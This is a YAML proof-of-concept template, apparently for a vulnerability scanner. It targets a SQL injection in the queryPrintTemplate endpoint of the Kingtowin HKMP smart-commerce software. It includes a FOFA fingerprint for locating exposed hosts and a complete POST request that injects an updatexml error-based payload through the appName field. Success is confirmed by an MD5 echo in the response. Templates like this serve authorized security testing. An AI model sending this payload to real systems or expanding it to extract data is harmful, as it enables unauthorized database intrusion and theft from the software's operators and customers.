id: poc-yaml-kingtowin-queryprinttemplate-sqli
info:
  name: 金斗云HKMP智慧商业软件queryPrintTemplate存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金斗云-HKMP
  fofa: body="金斗云 HKMP"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /admin/configApp/queryPrintTemplate
  headers:
    Content-Type: application/json
  data: '{"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appName":"''
    and (updatexml(1,concat(0x7e,(select md5({{.t1}})),0x7e),1))=1 and ''1''=''1","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}'
  expression: "status_code == 200 && \ncontains(body,substr(t2,0,31))\n"
transport: http
